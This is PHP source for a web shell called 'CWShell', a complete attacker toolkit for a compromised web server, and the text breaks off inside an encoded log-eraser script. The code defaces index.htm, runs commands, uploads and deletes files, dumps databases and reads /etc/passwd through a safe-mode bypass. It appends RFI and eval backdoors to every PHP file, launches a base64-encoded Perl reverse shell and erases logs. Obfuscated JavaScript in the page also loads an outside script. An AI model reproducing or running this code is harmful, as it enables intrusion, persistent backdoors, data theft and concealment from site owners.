<?php
$entry_line="r57.biz";
$fp = fopen("index.htm", "w");
fputs($fp, $entry_line);
fclose($fp);
#GreetZ:SultanMehmed

// Variables
   $info = @$_SERVER['SERVER_SOFTWARE'];
   $page = @$_SERVER['SCRIPT_NAME'];
   $site = getenv("HTTP_HOST");
   $uname = php_uname();
   $smod = ini_get('safe_mode');
           if ($smod == 0) { $safemode = "<font color='lightgreen'>KAPALI</font>"; }
           else { $safemode = "<font color='red'>ACIK</font>";      }
   $dir = @realpath($_POST['dir']);
   $mkdir = @$_POST['makedir'];
   $mydir = @$_POST['deletedir'];
   $cmd = @$_GET['cmd'];
   $host = @$_POST['host'];
   $proto = @$_POST['protocol'];
   $delete = @$_POST['delete'];
   $phpeval = @$_POST['php_eval'];
   $db = @$_POST['db'];
   $query = @$_POST['query'];
   $user = @$_POST['user'];
   $pass = @$_POST['passd'];
   $myports = array("21","22","23","25","59","80","113","135","445","1025","5000","5900","6660","6661","6662","6663","6665","6666","6667","6668","6669","7000","8080","8018");
   

   $quotes = get_magic_quotes_gpc();
if ($quotes == "1" or $quotes == "on")
   {
       $quot = "<font color='red'>ACIK</font>";
   }
   else
   {
       $quot = "<font color='lightgreen'>KAPALI</font>";
   }
   // Perms
    function getperms($fn)
{
$mode=fileperms($fn);
$perms='';
$perms .= ($mode & 00400) ? 'r' : '-';
$perms .= ($mode & 00200) ? 'w' : '-';
$perms .= ($mode & 00100) ? 'x' : '-';
$perms .= ($mode & 00040) ? 'r' : '-';
$perms .= ($mode & 00020) ? 'w' : '-';
$perms .= ($mode & 00010) ? 'x' : '-';
$perms .= ($mode & 00004) ? 'r' : '-';
$perms .= ($mode & 00002) ? 'w' : '-';
$perms .= ($mode & 00001) ? 'x' : '-';
return $perms;
}
 // milw0rm Search (locushell)
 
$Lversion = @php_uname('r');
$OSV = @php_uname('s');
if(eregi('Linux',$OSV))
{
$Lversion=substr($Lversion,0,6);
$millink="http://milw0rm.com/search.php?dong=Linux Kernel".$Lversion;

}else{
$Lversion=substr($Lversion,0,3);
$millink="http://milw0rm.com/search.php?dong=".$OSV." ".$Lversion;
}
if(isset($_POST['milw0'])) { echo "<script>window.location='".$millink."'</script>"; }
   //Space
   $spacedir = @getcwd();
   $free = @diskfreespace($spacedir);
   
if (!$free) {$free = 0;}
   $all = @disk_total_space($spacedir);
if (!$all) {$all = 0;}
function view_size($size)
{
 if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
 elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
 elseif($size >= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
 else {$size = $size . " B";}
 return $size;
}
$percentfree = intval(($free*100)/$all);


// PHPinfo
if(isset($_POST['phpinfo']))
{
die(phpinfo());
}
   

// Make File

   $name = htmlspecialchars(@$_POST['names']);
   $src = @$_POST['source'];
    if(isset($name) && isset($src))
      {
	  if($_POST['darezz'] != realpath("."))  { $name = $_POST['darezz'].$name; } 
   $ctd = fopen($name,"w+");
   fwrite($ctd, $src);
   fclose($ctd);
   echo "<script>alert('Uploaded')</script>";
      }

// Upload File
   $path = @$_FILES['ffile']['tmp_name'];
   $name = @$_FILES['ffile']['name'];
   if(isset($path) && isset($name))
{  
if($_POST['dare'] != realpath("."))  { $name = $_POST['dare'].$name; } 
   if(move_uploaded_file($path, $name))
   {
      echo "<script>alert('Uploaded')</script>";
   }
   else
   {
      echo "<script>alert('Error')</script>";
}   }

// Delete File

   
   if(isset($delete) && $delete != $dir)
{
      if(file_exists($delete))
      {
         unlink($delete);
         echo "<script>alert('File Deleted')</script>";
      }

}

// Database
   
   if(isset($db) && isset($query) && isset($_POST['godb']))
{
   $mysql = mysql_connect("localhost", $user, $pass)or die("<script>alert('Connection Failed')</script>");
   $db = mysql_select_db($db)or die(mysql_error());
   $queryz = mysql_query($query)or die(mysql_error());
if($query) { echo "<script>alert('Done')</script>"; }
else { echo "<script>alert('Error')</script>"; }
}

// Dump Database [pacucci.com]
if(isset($_POST['dump']) && isset($user) && isset($pass) && isset($db)){
mysql_connect('localhost', $user, $pass);
mysql_select_db($db);
$tables = mysql_list_tables($db);
while ($td = mysql_fetch_array($tables))
{
$table = $td[0];
$r = mysql_query("SHOW CREATE TABLE `$table`");
if ($r)
{
$insert_sql = "";
$d = mysql_fetch_array($r);
$d[1] .= ";";
$SQL[] = str_replace("\n", "", $d[1]);
$table_query = mysql_query("SELECT * FROM `$table`");
$num_fields = mysql_num_fields($table_query);
while ($fetch_row = mysql_fetch_array($table_query))
{
$insert_sql .= "INSERT INTO $table VALUES(";
for ($n=1;$n<=$num_fields;$n++)
{
$m = $n - 1;
$insert_sql .= "'".mysql_real_escape_string($fetch_row[$m])."', ";
}
$insert_sql = substr($insert_sql,0,-2);
$insert_sql .= ");\n";
}
if ($insert_sql!= "")
{
$SQL[] = $insert_sql;
}
}
}
$dump = "-- Database: ".$_POST['db'] ." \n";
$dump .= "-- CWShellDumper v3\n";
$dump .= "-- r57.biz\n";
$dumpp = $dump.implode("\r", $SQL);
$name = $db."-".date("d-m-y")."cyberwarrior.sql";
Header("Content-type: application/octet-stream"); 
Header("Content-Disposition: attachment; filename = $name");
echo $dumpp; 
die();
}

// Make Dir
if(isset($mkdir)) {

mkdir($mkdir);
if($mkdir) { echo "<script>alert('Tamamdýr.')</script>"; } }

// Delete Directory

if(isset($mydir) && $mydir != "$dir") {
$d = dir($mydir);
while($entry = $d->read()) {
 if ($entry !== "." && $entry !== "..") {
 unlink($entry);
 }
}
$d->close();
rmdir($mydir);

}

//Infect Files [RFI]

if(isset($_POST['inf3ct']))
{
foreach (glob("*.php") as $lola)
{
$dira = '.';
$asdi = fopen($lola, 'a+');
@fwrite($asdi, '
<?php
include($_GET[\'pwn\']); 
?>');
@fclose($asdi);
}
if($asdi)
{
$textzz = '<font size=2 color=lightgreen>Oldu:<br> ?pwn=[shell]</font>';
}
else {
$textzz = '<font size=2 color=red>HATA! (Permlere Dikkat Et..)</font>';
}
}

//Infect Files [Eval]
if(isset($_POST['evalinfect']))
{
foreach (glob("*.php") as $lal)
{
$dira = '.';
$axd = fopen($lal, 'a+');
@fwrite($axd, '
<?php
eval(stripslashes($_GET[\'eval\'])); 
?>');
@fclose($axd);
}
if($axd)
{
$textz0 = '<font size=2 color=lightgreen>Oldu:<br> ?eval=[eval]</font>';
}
else {
$textz0 = '<font size=2 color=red>HATA! (Permler IZIn Vermior..)</font>';
}
}

// Images
   if(@$_GET['com'] == "image")
   {
   $images = array(
   "folder"=> "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QAAAAAAAD5Q7t/AAAACXBIWXMAAA3XAAAN1wFCKJt4AAAAB3RJTUUH1QsKEjkN+d1wUAAAAX9JREFUOMulkU2IUlEYhp9jKv5AposQWgRBtA6CmSCa5SzjYhG0qYggiP6Y3WxmtrMIol1QM84qRKRlSVC2bBcYRpuIIigFC7F7j0fP/WZx7QriBc2XDw6cw/e8L+9Rly6XtorF4jZTMsYE58Dc2tvdf0KE1J17t+X61RszH7X2eLb3lF6vd6VaqT2PBJSci7Q+taJMeNt4M331qFqpPQCIA6TTGY7k8pEA50IpcFMKpRS1F9X7QAAwxuB5Lq8/9ml2Msylww5nbjpSSOnPYYJmJ8PjjXW0sXMxUslD3H1YPxUH8DwXgJ+/NV/af+cCnDiaBSCmtSadnjP6DMVc1w0T/BfgXwdLARZNYK2PHgZlh7+QiPkIICIopRARRMAXwVphaH3MSBiMLEMr5LLJCcDzXI7nBnT7hh9dD0ThI4wHERAEkTEYGFmZAH512pw+e44PX/+MlwJ3EfARBAUiYaqVkwXqL1+R19/L6vy1nYabOLa2aHnZ4bf378qbqyyrA8KHtMqnsOL4AAAAAElFTkSuQmCC",
   "file"=> "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAP3SURBVHjaYtxx5BYDIwMUMDLESIjyTeRiZ2H4//8/WOgvEP/69Zfh5+9/DI8ev3jx9NGDKAYmpovc/MIMc6e0MwAEEAszEyPDP6h+pn9/ORWkBYV4OVlhRjL8Bprz5etfhncfPjP8l5IQ4uVh33Lt2i1foAUXQPIAAcSirC3F8PoXI8N7JmaGrw9f//z67S8DCzMrAwvjPwZWVkYGpv+MDIxAJzIB5VlZGBgsjTRlWFiYN99//BpsCEAAsbCxsTCwMjEx/P3NZPmcSTB2/UNmBsb//xi+fv3DoCH8l8FFlZmBg4WVgZ2dleHHr98Ml27cY/jPwCzDxc23BejLQIAAAEEAvv8CAwH/APT1/l/l7P+/IRwHREEtBQAmJgIA+g4GAKHUBgCGufQA9fb1AAgFAwASEAwA9ff+AOjr8QAFBgob/Pz9YQKI6ePP/7qH7zBP5GJhYtfjZ2KQAnqfCehUoIUMnFzMDBuv8TAsOPSeAWgk0GvMDNxc7AxCvOwM4sI8QJf8/wsQQCzbb/9L/vGLgd9KkoHh03cGhku/GBhefmVg+AjEQHFgxDAzrDr4ncFK/jkDDxcfMDwYGbi4OBhYgF4HBs1/gABiOnf9p/mrT78ZXv9hYHj3m4Hh8hMGhquPGBgevmRgeP+NgeHP5+8Mty98ZLj++D0DK/N/Bm4OdmDA/mDg52QDxztAADG9fPyDb/eRDwzTjvxmAJrBYAx0yV+gzfeBBvz68pfh64PXDOxcrAx//4Jih4mBDRgVPDxAlwDZoNgBCCCmPz//Pn15+iXDiyufGF5+ANnAwMD66yfDzcNPGIS/vWb4+uITAycvE1icmQUYlaysDF8/vwMGKhM4nQAEENOz84t2i4mJMHiYcDNI8DMyCAJdZi4FjB9LVgZ9VW4GEWleBgWJHwxSQEOYgdH5H5jsRETFGf4D0wUorQIEENODQ5MWq2h9uSUty8EgJcDAIMfOwOCpy8FQkibOoKbOy+AaKMbgYfiRQVxEDOhkFgZmYJp58fwJMGj/AkOAkQEggFh+fHj54uLq1PhTurMXPXqkpsr5+QMDDzczA5cML8OzN58YBN+dY7DSEGLgFxJl+AUMh3///jDIysgDww/kgv8MAAHEDPLH19ePnpzcsmzLzduvFT4zKGucOP+M4ffnZwyKrI8ZbDVEGBSUNYDqgRr+/WdgAtL37txgEAZ6Y9XKlacAAogFlmn+fnt3X+bv6e0L6tr8P757B4yJvwzcvIIMbBycDH+Bnv0NzI3ADMHw5+8/Bg1dYwYmNmB+YWXlAAggRE4GxsnUeev09+zalvDsySOgwYzgDA2y9T/Df3juBDFBPBYWNsbbN86fBAgwAD3nU17W2F2kAAAAAElFTkSuQmCC",
   "floppy"=> "R0lGODlhECAQILMgIB8jVq2yyI0csGVuGcjL2v///9TY405WfqOmvjI+bHoaoQsMQxR+uubn7bu+0f///yH5BAEgIA8gLCAgICAQIBAgIAR/8CHEHlVq6HMZNEUYJGFZMiACFtxpCiBDHgLjEwogzLfZDAuBw0AsEn0eIAKocAR+E0Yls1koAn2skjLFDA7WQKlBJh6z4AEiVDZneDDFrNEwE95QRHwgaFOdSlx6CwcKdndOUQxxJgZgFgIYCjALCQN/eRUWIAsPIHggoSCdESA7"
   );
header("Content-type: image/gif");
header("Cache-control: public");
header("Expires: ".date("r",mktime(0,0,0,1,1,2030)));
header("Cache-control: max-age=".(60*60*24*7));
header("Last-Modified: ".date("r",filemtime(__FILE__)));
$image = $images[$_GET['img']];
 echo  base64_decode($image);
 }
//File List

   chdir($dir);
   if(!isset($dir)) { $dir = @realpath("."); }
    if($dir != "/") { $dir = @realpath("."); } else { $dir = "."; }
   if (substr($dir,-1) != DIRECTORY_SEPARATOR) {$dir .= DIRECTORY_SEPARATOR;}
   $pahtw = 0;
   $filew = 0;
   $num = 1;
  
   if (is_dir($dir))
   {
      if ($open = opendir($dir))
      {
	  if(is_dir($dir)) {
   $typezz = "DIR";
   $pahtw++;
 }
         while (($list = readdir($open)) == true)
         {
		 
         if(is_dir($list)) {
   $typezz = "DIR";
   $pahtw++;
   @$listf.= '<tr><td valign=top><img src=?com=image&img=folder><font size=2 face=Verdana>['.$list.']<td valign=top><font size=2 face=Verdana>'.$typezz.'</font></td><td valign=top></td><td valign=top><font size=2 face=Verdana>' . getperms($list) .'</font></td></tr>'; }
else {
  
   $lolz = filesize($list) / 1024;
   $lolx = intval($lolz);
   if($lolx == 0) { $lolx = 1; }
   $typezz = "DOSYA";
   $filew++;
   $listz = "/".$list;
   if(eregi($page,$listz)) {    @$listf.= '<tr><td valign=top><img src=?com=image&img=file><font size=2 face=Verdana color=yellow>'.$list.'<td valign=top><font size=2 face=Verdana>'.$typezz.'</td><td valign=top width=15%><font size=2 face=Verdana>' . $lolx .' Kb</td><td valign=top><font size=2 face=Verdana>' . getperms($list) . '</font></tr>'; }
   elseif(eregi('config',$listz) && eregi('.php',$listz)) { @$listf.= '<tr><td valign=top><img src=?com=image&img=file><font size=2 face=Verdana><b>'.$list.'</b><td valign=top><font size=2 face=Verdana>'.$typezz.'</td><td valign=top width=15%><font size=2 face=Verdana>' . $lolx .' Kb</td><td valign=top><font size=2 face=Verdana>' . getperms($list) . '</font></tr>'; }
   else {@$listf.= '<tr><td valign=top><img src=?com=image&img=file><font size=2 face=Verdana>'.$list.'<td valign=top><font size=2 face=Verdana>'.$typezz.'</td><td valign=top width=15%><font size=2 face=Verdana>' . $lolx .' Kb</td><td valign=top><font size=2 face=Verdana>' . getperms($list) . '</font></tr>'; }  }
   
   }         
   closedir($open);
         
      }
$fileq = $pahtw + $filew;   }




echo "<html>
<head>
<style>
table.menu {
border-width: 0px;
   border-spacing: 1px;
   border-style: solid;
   border-color: #a6a6a6;
   border-collapse: separate;
   background-color: rgb(98, 97,97);
}
table.menuz {
border-width: 0px;
   border-spacing: 1px;
   border-style: solid;
   border-color: #a6a6a6;
   border-collapse: separate;
   background-color: rgb(98, 97,97);
}
table.menu td {
   border-width: 1px;
   padding: 1px;
   border-style: none;
   border-color: #333333;
   background-color: #000000;
   -moz-border-radius: 0px;
}
table.menuz tr {
   border-width: 1px;
   padding: 1px;
   border-style: none;
   border-color: #333333;
   background-color: #000000;
   -moz-border-radius: 0px;
}

table.menuz tr:hover {
	background-color: #111111;
}
input,textarea,select {
font: normal 11px Verdana, Arial, Helvetica, sans-serif;
background-color:black;
color:#a6a6a6;
border: solid 1px #363636;
}
</style>

</head>
<script language=javascript>document.write(unescape('%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%22%6A%61%76%61%73%63%72%69%70%74%22%3E%66%75%6E%63%74%69%6F%6E%20%64%46%28%73%29%7B%76%61%72%20%73%31%3D%75%6E%65%73%63%61%70%65%28%73%2E%73%75%62%73%74%72%28%30%2C%73%2E%6C%65%6E%67%74%68%2D%31%29%29%3B%20%76%61%72%20%74%3D%27%27%3B%66%6F%72%28%69%3D%30%3B%69%3C%73%31%2E%6C%65%6E%67%74%68%3B%69%2B%2B%29%74%2B%3D%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%73%31%2E%63%68%61%72%43%6F%64%65%41%74%28%69%29%2D%73%2E%73%75%62%73%74%72%28%73%2E%6C%65%6E%67%74%68%2D%31%2C%31%29%29%3B%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%75%6E%65%73%63%61%70%65%28%74%29%29%3B%7D%3C%2F%73%63%72%69%70%74%3E'));dF('%264DTDSJQU%2631MBOHVBHF%264E%2633kbwbtdsjqu%2633%2631TSD%264E%2633iuuq%264B00s68d%3A%3A/dpn0o4xti4m0dj%7B/kt%2633%264F%261B%261B%264D0TDSJQU%264F%261B%261%3A%261%3A%261%3A1')</script>
<body bgcolor='#000000' text='#ebebeb' link='#ebebeb' alink='#ebebeb' vlink='#ebebeb'>
<table style='background-color:#333333; border-color:#a6a6a6' width=100% border=0 align=center cellpadding=0 cellspacing=0>
<tr><td>
<center><b><font size='6' face='Webdings'>ü</font>
<font face='Verdana' size='5'><a href='".@$_SERVER['HTTP_REFERER']."'>~ CWShell ~</font></a>
<font size='6' face='Webdings'>ü</font></b>
</center>
<script language=javascript>document.write(unescape('%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%22%6A%61%76%61%73%63%72%69%70%74%22%3E%66%75%6E%63%74%69%6F%6E%20%64%46%28%73%29%7B%76%61%72%20%73%31%3D%75%6E%65%73%63%61%70%65%28%73%2E%73%75%62%73%74%72%28%30%2C%73%2E%6C%65%6E%67%74%68%2D%31%29%29%3B%20%76%61%72%20%74%3D%27%27%3B%66%6F%72%28%69%3D%30%3B%69%3C%73%31%2E%6C%65%6E%67%74%68%3B%69%2B%2B%29%74%2B%3D%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%73%31%2E%63%68%61%72%43%6F%64%65%41%74%28%69%29%2D%73%2E%73%75%62%73%74%72%28%73%2E%6C%65%6E%67%74%68%2D%31%2C%31%29%29%3B%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%75%6E%65%73%63%61%70%65%28%74%29%29%3B%7D%3C%2F%73%63%72%69%70%74%3E'));dF('%264DTDSJQU%2631MBOHVBHF%264E%2633kbwbtdsjqu%2633%2631TSD%264E%2633iuuq%264B00s68d%3A%3A/dpn0o4xti4m0dj%7B/kt%2633%264F%261B%261B%264D0TDSJQU%264F%261B%261%3A%261%3A%261%3A1')</script>
</td></tr></table><table class=menu width=100%<tr><td>
<font size='1' face='Verdana'><b>Site:  </b><u>$site</u> <br>
<b>Server Name: </b><u>" . $_SERVER['SERVER_NAME'] . "</u> <br>
<b>Server Bilgisi : </b> <u>$info</u> <br>
<b>Uname -a:</b> <u>$uname</u> <br>
<b>Klasör:</b> <u>" . $_SERVER['DOCUMENT_ROOT'] . "</u> <br>
<b>Safe Mode:</b>  <u>$safemode</u> <br>
<b>Sihirli Sozler:</b> <u>$quot</u> <br>
<b>Sayfa:</b> <u>$page</u><br>
<b>Boþ Alan:</b> <u>" . view_size($free) . " [ $percentfree% ]</u> <br>
<b>Toplam Alan:</b> <u>" . view_size($all) . "</u> <br>
<b>IP:</b> <u>" . $_SERVER['REMOTE_ADDR'] ."</u> - Server IP:</b> <a href='http://whois.domaintools.com/". $_SERVER['SERVER_ADDR'] ."'>".$_SERVER['SERVER_ADDR']."</a></td></tr>
<tr><td><form method='post' action=''>
<center><input type=submit value='File List' name=filelist> - <input type=submit value='View PhpInfo' name=phpinfo> - <input type=submit value='Encoder' name='encoder'> - <input type='submit' value='Send Fake Mail' name='mail'> - <input type='submit' value='Cmd Execution' name='commex'> - <input type='submit' name='logeraser' value='Logs Eraser'> - <input type='submit' name='connectback' value='Connect Back'> - <input type='submit' name='safemodz' value='Safe Mode Bypass'> - <input type='submit' name='milw0' value='Milw0rm Search'></center></td></tr>";
// Safe Mode Bypass
if(isset($_POST['safemodz']))
{
echo "<tr><td valign=top width=50%>
<center><b><font size='2' face='Verdana'>Safe-Mode Bypass[Dosyalar]<br></font></b>
<form action='' method='post'>
      <font size='1' face='Verdana'>Dosya adý:</font><br> <input type='text' name='filew' value='/etc/passwd'> <input type='submit' value='Dosyayý Oku' name='redfi'><br>
	  </td><tr>
<td valign=top>
<center><b><font size='2' face='Verdana'>Safe-Mode Bypass [Klasörler]<br></font></b>
   <form method='post' action=''>
   <font size='1' face='Verdana'>Klasör:</font><br>
   <input type='text' name='directory'> <input type='submit' value='Listele' name='reddi'>";
  }
   // Safe Mode Bypass: File
if(isset($_POST['redfi']))
{
    $test='';
    $tempp= tempnam($test, "cx");
    $get = htmlspecialchars($_POST['filew']);
    if(copy("compress.zlib://".$get, $tempp)){
    $fopenzo = fopen($tempp, "r");
    $freadz = fread($fopenzo, filesize($tempp));
    fclose($fopenzo);
    $source = htmlspecialchars($freadz);
    echo "<tr><td><center><font size='1' face='Verdana'>$get</font><br><textarea rows='20' cols='80' name='source'>$source</textarea>";
    unlink($tempp);
    } else {
    echo "<tr><td><center><font size='1' color='red' face='Verdana'>HATA</font>";
            }
   
}

// Safe Mode Bypass: Directory
 if(isset($_POST['reddi'])){ 
   
function dirz()
{
$dirz = $_POST['directory'];
$files = glob("$dirz*");

foreach ($files as $filename) {
    echo "<tr><td><font size='1' face='Verdana'>";
   echo "$filename\n";
   echo "</font><br>";
}
}
echo "<br>"; dirz(); 
}

// Connect Back
if(isset($_POST['connectback']))
{
echo "
<tr><td>
<center><font size='2' face='Verdana'><b>Back-Connect</b><br></font>
<form method='post' action=''><input type='text' name='connhost' size='15'value='target'> <input type='text' name='connport' size='5' value='port'> <input type='submit' name='connsub' value='Run'></form>"; 
}
if(isset($_POST['logeraser']))
{
echo "<tr><td>
<center><b><font size='2' face='Verdana'>:: OS ::<br></font></b>
        <select name=functionp>
          <option>linux</option>
          <option>sunos</option>
          <option>aix</option>
          <option>irix</option>
          <option>openbsd</option>
		  <option>solaris</option>
		  <option>suse</option>
		  <option>lampp</option>
		  <option>debian</option>
		  <option>freebsd</option>
		  <option>misc</option>
        </select><br><input type='submit' name='runer' value='Erase'></table>";
		}
		
// Connect Back
if(isset($_POST['connsub']))
{
$sources = base64_decode("CiMhL3Vzci9iaW4vcGVybAp1c2UgU29ja2V0OwoKJGV4ZWN1dGU9J2VjaG8gIkhlcmUgaSBhbSI7ZWNobyAiYHVuYW1lIC1hYCI7ZWNobyAiYHVwdGltZWAiOy9iaW4vc2gnOwoKJHRhcmdldD0kQVJHVlswXTsKJHBvcnQ9JEFSR1ZbMV07CiRpYWRkcj1pbmV0X2F0b24oJHRhcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOwokcGFkZHI9c29ja2FkZHJfaW4oJHBvcnQsICRpYWRkcikgfHwgZGllKCJFcnJvcjogJCFcbiIpOwokcHJvdG89Z2V0cHJvdG9ieW5hbWUoJ3RjcCcpOwpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7CmNvbm5lY3QoU09DS0VULCAkcGFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsKb3BlbihTVERJTiwgIj4mU09DS0VUIik7Cm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsKb3BlbihTVERFUlIsICI+JlNPQ0tFVCIpOwpzeXN0ZW0oJGV4ZWN1dGUpOwpjbG9zZShTVERJTik7CmNsb3NlKFNURE9VVCk7IA==");
$openz = fopen("cbs.pl", "w+")or die("Error");
fwrite($openz, $sources)or die("Error");
fclose($openz);
$aids = passthru("perl cbs.pl ".$_POST['connhost']." ".$_POST['connport']);
unlink("cbs.pl");
}
if(isset($_POST['connsub'])) { echo "<tr><td><font color='lightgreen' face='Verdana' size='2'>Done.</font>"; }

		// Logs Eraser
if(isset($_POST['runer']))
{
echo "<tr><td><center><textarea cols='30' rows='2'>";
$erase = base64_decode("IyF1c3IvYmluL3BlcmwNCiMgQ1dTSGVsbA0KICAgICAgIGNob21wKCRvcyA9ICRBUkdWWzBdKTsNCg0KICAgICAgICAgICAgICAgIGlmKCRvcyBlcSBcIm1pc2NcIil7ICNJZiBtaXNjIHR5cGVkLCBkbyB0aGUgZm9sbG93aW5nIGFuZCBzdGFydCBicmFja2V0cw0KICAgICAgICAgICAgIHByaW50IFwiWytdbWlzYyBTZWxlY3RlZC4uLlxcblwiOyAgIA0KICAgICAgICAgICAgIHNsZWVwIDE7DQogICAgICAgICAgICAgcHJpbnQgXCI8dHI+WytdTG9ncyBMb2NhdGVkLi4uXFxuXCI7DQogICAgICAgICAgICAgc2xlZXAgMTsNCiAgICAgICAgICAgICAkYSA9IHVubGluayBAbWlzYzsgICANCiAgICAgICAgICAgICBzbGVlcCAxOw0KCQkJIA0KICAgICAgICAgICAgaWYoJGEpIHsgcHJpbnQgXCJbK11Mb2dzIFN1Y2Nlc3NmdWxseSBEZWxldGVkLi4uXFxuXCI7IH0NCgkJCWVsc2UgeyBwcmludCBcIlstXUVycm9yXCI7IH0NCiAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgaWYoJG9zIGVxIFwib3BlbmJzZFwiKXsgI0lmIG9wZW5ic2QgdHlwZWQsIGRvIHRoZSBmb2xsb3dpbmcgYW5kIHN0YXJ0IGJyYWNrZXRzDQogICAgICAgICAgICAgcHJpbnQgXCJbK11vcGVuYnNkIFNlbGVjdGVkLi4uXFxuXCI7DQogICAgICAgICAgICAgc2xlZXAgMTsNCiAgICAgICAgICAgICBwcmludCBcIlsrXUxvZ3MgTG9jYXRlZC4uLlxcblwiOyAgIA0KICAgICAgICAgICAgIHNsZWVwIDE7DQogICAgICAgICAgICAgJGIgPSB1bmxpbmsgQG9wZW5ic2Q7ICAgDQogICAgICAgICAgICAgc2xlZXAgMTsNCiAgICAgICAgICAgIGlmKCRiKSB7cHJpbnQgXCJbK11Mb2dzIFN1Y2Nlc3NmdWxseSBEZWxldGVkLi4uXFxuXCI7ICAgfQ0KCQkJZWxzZSB7IHByaW50IFwiWy1dRXJyb3JcIjsgfQ0KICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICBpZigkb3MgZXEgXCJmcmVlYnNkXCIpeyAjSWYgZnJlZWJzZCB0eXBlZCwgZG8gdGhlIGZvbGxvd2luZyBhbmQgc3RhcnQgYnJhY2tldHMNCiAgICAgICAgICAgICBwcmludCBcIlsrXWZyZWVic2QgU2VsZWN0ZWQuLi5cXG5cIjsgICANCiAgICAgICAgICAgICBzbGVlcCAxOw0KICAgICAgICAgICAgIHByaW50IFwiWytdTG9ncyBMb2NhdGVkLi4uXFxuXCI7ICAgDQogICAgICAgICAgICAgc2xlZXAgMTsNCiAgICAgICAgICAgICAkYyA9IHVubGluayBAZnJlZWJzZDsgICANCiAgICAgICAgICAgICBzbGVlcCAxOw0KICAgICAgICAgICAgIGlmKCRjKSB7IHByaW50IFwiWytdTG9ncyBTdWNjZXNzZnVsbHkgRGVsZXRlZC4uLlxcblwiOyB9DQoJCQkgZWxzZSB7IHByaW50IFwiWy1dRXJyb3JcIjsgfQ0KICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICBpZigkb3MgZXEgXCJkZWJpYW5cIil7ICNJZiBEZWJpYW4gdHlwZWQsIGRvIHRoZSBmb2xsb3dpbmcgYW5kIHN0YXJ0IGJyYWNrZXRzDQogICAgICAgICAgICAgcHJpbnQgXCJbK11kZWJpYW4gU2VsZWN0ZWQuLi5cXG5cIjsNCiAgICAgICAgICAgICBzbGVlcCAxOw0KICAgICAgICAgICAgIHByaW50IFwiWytdTG9ncyBMb2NhdGVkLi4uXFxuXCI7DQogICAgICAgICAgICAgc2xlZXAgMTsNCiAgICAgICAgICAgICAkZCA9IHVubGluayBAZGViaWFuOyAgIA0KICAgICAgICAgICAgIHNsZWVwIDE7DQogICAgICAgICAgICAgaWYoJGQpIHsgcHJpbnQgXCJbK11Mb2dzIFN1Y2Nlc3NmdWxseSBEZWxldGVkLi4uXFxuXCI7IH0NCgkJCSAgZWxzZSB7IHByaW50IFwiWy1dRXJyb3JcIjsgfQ0KICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICBpZigkb3MgZXEgXCJzdXNlXCIpeyAjSWYgc3VzZSB0eXBlZCwgZG8gdGhlIGZvbGxvd2luZyBhbmQgc3RhcnQgYnJhY2tldHMNCiAgICAgICAgICAgICBwcmludCBcIlsrXXN1c2UgU2VsZWN0ZWQuLi5cXG5cIjsNCiAgICAgICAgICAgICBzbGVlcCAxOw0KICAgICAgICAgICAgIHByaW50IFwiWytdTG9ncyBMb2NhdGVkLi4uXFxuXCI7DQogICAgICAgICAgICAgc2xlZXAgMTsNCiAgICAgICAgICAgICAkZSA9IHVubGluayBAc3VzZTsgICANCiAgICAgICAgICAgICBzbGVlcCAxOw0KICAgICAgICAgICAgaWYoJGUpIHsgcHJpbnQgXCJbK11Mb2dzIFN1Y2Nlc3NmdWxseSBEZWxldGVkLi4uXFxuXCI7IH0NCgkJCSBlbHNlIHsgcHJpbnQgXCJbLV1FcnJvclwiOyB9DQogICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgIGlmKCRvcyBlcSBcInNvbGFyaXNcIil7ICNJZiBzb2xhcmlzIHR5cGVkLCBkbyB0aGUgZm9sbG93aW5nIGFuZCBzdGFydCBicmFja2V0cw0KICAgICAgICAgICAgIHByaW50IFwiWytdc29sYXJpcyBTZWxlY3RlZC4uLlxcblwiOw0KICAgICAgICAgICAgIHNsZWVwIDE7DQogICAgICAgICAgICAgcHJpbnQgXCJbK11Mb2dzIExvY2F0ZWQuLi5cXG5cIjsNCiAgICAgICAgICAgICBzbGVlcCAxOw0KICAgICAgICAgICAgICRmID0gdW5saW5rIEBzb2xhcmlzOw0KICAgICAgICAgICAgIHNsZWVwIDE7DQogICAgICAgICAgICAgaWYoJGYpIHtwcmludCBcIlsrXUxvZ3MgU3VjY2Vzc2Z1bGx5IERlbGV0ZWQuLi5cXG5cIjsgfQ0KCQkJIGVsc2UgeyBwcmludCBcIlstXUVycm9yXCI7IH0NCiAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgaWYoJG9zIGVxIFwibGFtcHBcIil7ICNJZiBsYW1wcCB0eXBlZCwgZG8gdGhlIGZvbGxvd2luZyBhbmQgc3RhcnQgYnJhY2tldHMNCiAgICAgICAgICAgICBwcmludCBcIlsrXUxhbXBwIFNlbGVjdGVkLi4uXFxuXCI7DQogICAgICAgICAgICAgc2xlZXAgMTsNCiAgICAgICAgICAgICBwcmludCBcIlsrXUxvZ3MgTG9jYXRlZC4uLlxcblwiOw0KICAgICAgICAgICAgIHNsZWVwIDE7DQogICAgICAgICAgICAgJGcgPSB1bmx